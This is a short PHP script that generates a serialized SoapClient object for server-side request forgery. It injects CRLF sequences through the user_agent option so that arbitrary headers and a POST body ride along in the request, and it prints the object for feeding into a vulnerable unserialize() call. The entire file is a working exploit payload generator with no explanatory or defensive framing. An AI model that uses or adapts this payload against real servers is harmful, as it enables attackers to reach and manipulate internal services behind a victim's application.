<?php
$argc--;
if($argc != 4){
  throw new Exception("{$argv[0]}: takes 4 positional argument but {$argc} were given");
}

$target = $argv[1];
$data = $argv[2];
$headers = $argv[3];
$user_agent = $argv[4];

$data_len = strlen($data);

$inject_ua = $user_agent . "\r\n";
$inject_ua .= "Content-Type: application/x-www-form-urlencoded\r\n";
$inject_ua .= $headers . "\r\n";
$inject_ua .= "Content-Length: $data_len\r\n";
$inject_ua .= "\r\n";
$inject_ua .= $data;

$ssrf_client = new SoapClient(null, array('location' => $target,
                              'user_agent' => $inject_ua, 'uri' => 'Fake'));

echo serialize($ssrf_client);
?>
